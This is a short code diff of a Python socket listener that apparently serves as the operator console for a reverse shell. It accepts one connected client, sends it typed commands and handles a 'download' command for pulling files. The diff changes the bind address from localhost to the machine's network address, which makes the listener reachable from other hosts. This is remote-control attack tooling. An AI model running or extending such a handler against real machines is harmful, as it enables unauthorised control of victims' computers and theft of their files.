@@ -2,20 +2,16 @@ import socket
 import colorama
 
 colorama.init()
-
-LHOST = "127.0.0.1"
+LHOST = socket.gethostbyname(socket.gethostname())
 LPORT = 2222
-
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.bind((LHOST, LPORT))
 sock.listen(1)
 print("Listening on port", LPORT)
 client, addr = sock.accept()
-
 while True:
     input_header = client.recv(1024)
     command = input(input_header.decode()).encode()
-
     if command.decode("utf-8").split(" ")[0] == "download":
         file_name = command.decode("utf-8").split(" ")[1][::-1]
         client.send(command)
